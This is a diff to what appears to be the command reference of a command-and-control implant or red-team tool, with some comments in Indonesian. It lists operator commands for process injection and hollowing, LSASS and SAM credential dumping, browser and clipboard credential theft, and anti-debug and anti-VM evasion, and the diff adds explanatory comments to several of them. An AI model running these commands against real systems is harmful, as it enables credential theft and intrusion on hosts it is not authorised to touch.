@@ -97,14 +97,14 @@ inject remote <id> --pid 3048 --file payload.bin --method crt
 inject remote <id> --pid 3048 --file payload.bin --method apc
 inject self   <id> --file payload.bin
 inject ppid   <id> --exe "cmd.exe" --ppid-name explorer.exe
-hollow        <id> --file payload.bin [--exe svchost.exe]
+hollow        <id> --file payload.bin [--exe svchost.exe]   # auto-detect: PE atau shellcode
 hijack        <id> --pid 3048 --file payload.bin
 stomp         <id> --file payload.bin --dll xpsservices.dll
 mapinject     <id> --file payload.bin [--pid 3048]
 
 # ─── CREDENTIALS ────────────────────────────────────────────────────────────
 creds lsass    <id> [--output C:\Temp\lsass.dmp]
-creds sam      <id> [--output-dir C:\Temp]
+creds sam      <id> [--output-dir C:\Temp]             # auto-fallback ke VSS jika SeBackupPriv tidak ada
 creds browser  <id>
 creds clipboard <id>
 
@@ -128,7 +128,7 @@ registry delete <id> --hive HKCU --key "Software\Test" --value MyVal
 registry list   <id> --hive HKLM --key "SOFTWARE\Microsoft"
 
 # ─── ADVANCED ───────────────────────────────────────────────────────────────
-bof      <id> --file dir.o [--args-b64 <packed>]
+bof      <id> --file dir.o [--args-b64 <packed>]        # pack args: python3 pack_bof_args.py --str "..." --b64
 opsec antidebug <id>
 opsec antivm    <id>
 opsec timegate  <id> --work-start 8 --work-end 18 --kill-date 2026-12-31
